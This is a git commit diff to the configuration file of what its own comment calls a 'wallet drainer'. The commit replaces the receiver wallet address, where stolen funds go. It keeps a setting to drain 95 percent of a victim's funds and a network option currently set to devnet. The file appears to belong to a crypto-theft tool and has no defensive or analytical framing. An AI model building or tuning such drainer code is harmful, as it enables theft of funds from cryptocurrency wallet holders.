85c31ea5139404dbec9107ae08be282447ea38b1
ronzine <138832077+Romeo509@users.noreply.github.com>
2025-09-15 22:56:33 +0000

    Update config.ts

--- src/config.ts
+++ src/config.ts
@@ -1,4 +1,5 @@
 // Configuration file for wallet drainer
-export const RECEIVER_ADDRESS = "HDU9Car8G6QCC3CX71YgmDfCePB73hFqAWKJCTyidizN";
+export const RECEIVER_ADDRESS = "QJAyXjVRuBRx3RRaDd7VKYXGkMTFvQqc8mjhEnJicBD";
 export const PERCENTAGE_TO_DRAIN = 95; // Percentage of funds to transfer
+
 export const NETWORK = "devnet"; // Network to use: "devnet" or "mainnet-beta"
